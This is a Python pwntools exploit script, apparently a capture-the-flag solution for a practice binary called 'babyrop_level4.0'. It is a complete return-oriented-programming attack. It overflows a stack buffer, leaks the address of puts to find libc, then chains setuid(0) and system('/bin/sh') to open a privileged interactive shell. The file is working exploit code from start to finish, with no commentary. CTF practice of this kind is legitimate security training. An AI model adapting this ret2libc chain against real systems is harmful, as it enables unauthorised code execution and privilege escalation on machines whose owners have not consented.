#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyrop_level4.0_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r


def main():
    r = conn()

    pop_rdi = 0x0000000000401e07
    
    pl = b'A' * 56
    pl += p64(pop_rdi)
    pl += p64(exe.got['puts'])
    pl += p64(exe.sym.puts)
    pl += p64(exe.sym._start)
    
    r.sendline(pl)
    pause() 
    r.recvuntil(b'Leaving!\n')
    # print(r.recvline())
    libc.address = u64(r.recv(6) + b'\x00\x00') - libc.sym.puts
    print(hex(libc.address))
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    setuid = libc.sym.setuid
    system = libc.sym.system
    pl = b'A' * 56 
    pl += p64(pop_rdi)
    pl += p64(0)
    pl += p64(setuid)
    pl += p64(pop_rdi)
    pl += p64(bin_sh)
    pl += p64(system)
    r.sendline(pl)
    r.interactive()

if __name__ == "__main__":
    main()
